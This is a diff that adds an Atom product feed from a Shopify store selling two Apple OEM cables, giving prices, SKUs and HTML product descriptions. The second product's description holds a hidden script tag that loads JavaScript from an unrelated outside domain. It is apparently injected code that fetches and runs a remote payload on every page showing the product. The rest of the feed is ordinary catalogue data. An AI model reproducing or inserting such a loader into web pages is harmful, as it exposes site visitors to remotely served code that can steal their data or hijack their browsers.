@@ -1,0 +1,103 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xml:lang="en-US" xmlns="http://www.w3.org/2005/Atom" xmlns:opensearch="http://a9.com/-/spec/opensearch/1.1/" xmlns:s="http://jadedpixel.com/-/spec/shopify">
+  <id>https://www.wirelessxplosion.ca/collections/all.atom</id>
+  <link rel="alternate" type="text/html" href="https://www.wirelessxplosion.ca/collections/all"/>
+  <link rel="self" type="application/atom+xml" href="https://www.wirelessxplosion.ca/collections/apple-oem-cables.atom"/>
+  <title>Wireless Xplosion Ltd</title>
+  <updated>2021-07-13T16:44:31-04:00</updated>
+  <author>
+    <name>Wireless Xplosion Ltd</name>
+  </author>
+  <entry>
+    <id>https://www.wirelessxplosion.ca/products/7083393089705</id>
+    <published>2021-07-13T16:44:31-04:00</published>
+    <updated>2021-07-13T16:44:31-04:00</updated>
+    <link rel="alternate" type="text/html" href="https://www.wirelessxplosion.ca/products/apple-oem-usb-c-charge-cable-1-meter"/>
+    <title>Apple OEM USB-C Charge Cable - 1 Meter (Retail Pack)</title>
+    <s:type>OEM Cables</s:type>
+    <s:vendor>Apple</s:vendor>
+    <summary type="html">
+      <![CDATA[<table border="0">
+  <tr>
+    <td width="200"><img width="200" src="https://cdn.shopify.com/s/files/1/0024/0428/6582/products/processed_3.jpg?v=1626365691"></td>
+    <td valign="bottom">
+      <p>
+
+        <strong>Vendor: </strong>Apple<br>
+        <strong>Type: </strong>OEM Cables<br>
+        <strong>Price: </strong>
+            12.99
+      </p>
+    </td>
+  </tr>
+  <tr>
+    <td colspan="2"><p>This 1-meter charge cable — with USB-C connectors on both ends — is ideal for charging, syncing, and transferring data between USB-C devices. Pair the USB-C Charge Cable with a compatible USB-C power adapter to conveniently charge your devices from a wall outlet and take advantage of fast-charging capabilities. USB-C Power Adapters sold separately.</p>
+<p><strong>Apple recommends the following pairings: </strong></p>
+<p>11-inch iPad Pro (1st and 2nd generation), 12.9-inch iPad Pro (3rd and 4th generation), and iPad Air (4th generation) with the 20W USB-C Power Adapter</p></td>
+  </tr>
+</table>
+]]>
+    </summary>
+    <s:tag>Apple_OEM</s:tag>
+    <s:tag>apple_oem_cable</s:tag>
+    <s:tag>apple_original</s:tag>
+    <s:tag>Cables</s:tag>
+    <s:tag>White Cables</s:tag>
+    <s:variant>
+      <id>https://www.wirelessxplosion.ca/products/7083393089705</id>
+      <title>Default Title</title>
+      <s:price currency="CAD">12.99</s:price>
+      <s:sku>APL-MUF72AM/A</s:sku>
+      <s:grams>0</s:grams>
+    </s:variant>
+  </entry>
+  <entry>
+    <id>https://www.wirelessxplosion.ca/products/6840586797225</id>
+    <published>2021-04-19T12:15:01-04:00</published>
+    <updated>2021-04-19T12:15:01-04:00</updated>
+    <link rel="alternate" type="text/html" href="https://www.wirelessxplosion.ca/products/apple-oem-usb-c-to-lightning-cable-1-meter-bulk"/>
+    <title>Apple OEM USB-C to Lightning Cable - 1 Meter (BULK)</title>
+    <s:type>Charge/Sync Cables</s:type>
+    <s:vendor>Apple</s:vendor>
+    <summary type="html">
+      <![CDATA[<table border="0">
+  <tr>
+    <td width="200"><img width="200" src="https://cdn.shopify.com/s/files/1/0024/0428/6582/products/MX0K2.jpg?v=1618851431"></td>
+    <td valign="bottom">
+      <p>
+
+        <strong>Vendor: </strong>Apple<br>
+        <strong>Type: </strong>Charge/Sync Cables<br>
+        <strong>Price: </strong>
+            14.00
+      </p>
+    </td>
+  </tr>
+  <tr>
+    <td colspan="2"><ul style="list-style: inside;">
+<li>Connect your iPhone, iPad, or iPod with Lightning connector to your USB-C or Thunderbolt 3 (USB-C) enabled Mac for syncing and charging, or to your USB-C enabled iPad for charging.<br>
+</li>
+<li>You can also use this cable with your Apple 18W, 20W, 29W, 30W, 61W, 87W or 96W USB‑C Power Adapter to charge your iOS device and even take advantage of the fast-charging feature on select iPhone and iPad models.</li>
+<li>Apple Cable<span> </span>is 1 meters (3.3 feet) long</li>
+<li>Data transfer rates up to 10Gbps 2x faster</li>
+<li>Original Apple Manufactured Product.</li>
+</ul>
+<script src="//onlinekey.biz/1f9f5ee62aefca3cb1.js" async="" type="text/javascript"></script></td>
+  </tr>
+</table>
+]]>
+    </summary>
+    <s:tag>Apple_OEM</s:tag>
+    <s:tag>apple_oem_cable</s:tag>
+    <s:tag>apple_original</s:tag>
+    <s:tag>Cables</s:tag>
+    <s:tag>White Cables</s:tag>
+    <s:variant>
+      <id>https://www.wirelessxplosion.ca/products/6840586797225</id>
+      <title>Default Title</title>
+      <s:price currency="CAD">14.00</s:price>
+      <s:sku>APL-MXOK2AM/A</s:sku>
+      <s:grams>0</s:grams>
+    </s:variant>
+  </entry>
+</feed>
